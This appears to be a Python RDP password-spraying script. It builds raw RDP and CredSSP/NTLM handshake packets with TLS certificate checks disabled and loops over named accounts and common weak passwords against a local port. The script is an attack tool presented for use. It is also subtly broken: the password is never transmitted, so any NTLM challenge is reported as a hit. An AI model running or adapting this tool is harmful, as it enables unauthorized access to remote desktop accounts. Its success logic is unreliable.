import socket
import struct
import ssl
import hashlib
import hmac
import os
import time

def ntlm_hash(password):
    return hashlib.new('md4', password.encode('utf-16le')).digest()

def create_ntlm_negotiate():
    return (
        b"NTLMSSP\x00"
        b"\x01\x00\x00\x00"
        b"\x97\x82\x08\xe2"
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x06\x01\x00\x00\x00\x00\x00\x0f"
    )

def try_rdp_auth(host, port, username, password, domain=""):
    try:
        cookie = f"Cookie: mstshash={username}\r\n".encode()
        neg_req = bytes([0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00])
        x224_data = bytes([0xe0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg_req
        cr = bytes([0x03, 0x00]) + struct.pack(">H", 4 + 1 + len(x224_data)) + bytes([len(x224_data)]) + x224_data
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        sock.sendall(cr)
        resp = sock.recv(1024)
        
        if resp[5] != 0xd0:
            return False, "Connection rejected"
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ssl_sock = ctx.wrap_socket(sock, server_hostname=host)
        
        ntlm_neg = create_ntlm_negotiate()
        
        credssp_neg = bytes([0x30, 0x25, 0xa0, 0x03, 0x02, 0x01, 0x03, 0xa1, 0x1e, 0x30, 0x1c, 0x30, 0x1a, 0xa0, 0x18, 0x04, 0x16]) + ntlm_neg
        
        ssl_sock.send(credssp_neg)
        credssp_resp = ssl_sock.recv(4096)
        
        if len(credssp_resp) > 50:
            if b"NTLMSSP" in credssp_resp:
                return True, f"Got NTLM challenge ({len(credssp_resp)}b)"
            return False, f"Unexpected response ({len(credssp_resp)}b)"
        
        ssl_sock.close()
        return False, "No challenge"
        
    except ssl.SSLError as e:
        if "internal error" in str(e).lower():
            return False, "TLS error (possible auth block)"
        return False, f"SSL: {e}"
    except Exception as e:
        return False, str(e)

print("=== RDP PASSWORD SPRAY ===\n")

users = ["melody", "mikeb", "admin", "administrator"]
passwords = ["", "password", "Password1", "123456", "admin", "welcome", "Welcome1", "letmein", "qwerty", "abc123"]

print(f"Testing {len(users)} users x {len(passwords)} passwords = {len(users)*len(passwords)} attempts\n")

for user in users:
    print(f"\n[*] Testing user: {user}")
    for pwd in passwords:
        pwd_display = pwd if pwd else "(blank)"
        success, msg = try_rdp_auth("localhost", 3390, user, pwd)
        if success:
            print(f"    [!] {user}:{pwd_display} - {msg}")
        else:
            print(f"    [-] {user}:{pwd_display} - {msg}")
        time.sleep(0.2)
        
        if "challenge" in msg.lower() or "auth" not in msg.lower():
            break
